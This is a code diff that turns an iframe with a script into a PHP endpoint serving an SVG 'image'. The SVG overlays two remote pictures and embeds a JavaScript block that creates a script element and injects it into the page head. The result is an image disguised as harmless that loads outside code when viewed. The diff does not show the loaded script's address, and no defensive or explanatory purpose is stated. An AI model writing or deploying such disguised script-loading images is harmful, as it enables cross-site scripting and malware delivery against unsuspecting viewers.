@@ -1,16 +1,27 @@
-<iframe
-  id="iframe"
-  sandbox="allow-same-origin"
-  style="width: 400px; height: 400px; border: none;"
-  srcdoc='
-    <div style="position: relative; display: inline-block;">
-      <img src="https://raw.githubusercontent.com/totallylost-helpme/totallylost-helpme.github.io/refs/heads/main/aigril2.png" 
-           alt="Base Image" 
-           style="width: 300px; height: auto;">
-      <img src="https://bit.ly/4aoMbTQ" 
-           alt="Overlay Image" 
-           style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100px; height: auto;">
-<script type="application/javascript">
+<?php
+// Set the content type to SVG
+header('Content-Type: image/svg+xml');
+?>
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+
+  <!-- Base Image -->
+  <image href="https://raw.githubusercontent.com/totallylost-helpme/totallylost-helpme.github.io/refs/heads/main/aigril2.png" 
+         alt="Base Image" 
+         width="300" 
+         height="auto" />
+  
+  <!-- Overlay Image, centered -->
+  <image href="https://ci3.googleusercontent.com/meips/ADKq_NaPYSHR7qW9reOq_0GmDyIua-pDCwJBlcvWfiOlVV0kzEP1uR97BZcYVGF5E87G_U9i3E5q8co9mIoGvgsZtgATC40fL8kQaTebsrtgOodzFeZHxEF2CG8=s0-d-e1-ft" 
+         alt="Overlay Image" 
+         x="50%" 
+         y="50%" 
+         width="100" 
+         height="auto"
+         transform="translate(-50%, -50%)" />
+  
+  <!-- JavaScript Embedded Inside SVG -->
+  <script type="application/javascript">
     <![CDATA[
       (function(){
         var s = document.createElement('script');
@@ -22,5 +33,6 @@
         document.head.appendChild(s);  <!-- Append to head to ensure it's loaded properly -->
       })();
     ]]>
-  </script>    </div>'>
-</iframe> 
+  </script>
+
+</svg>
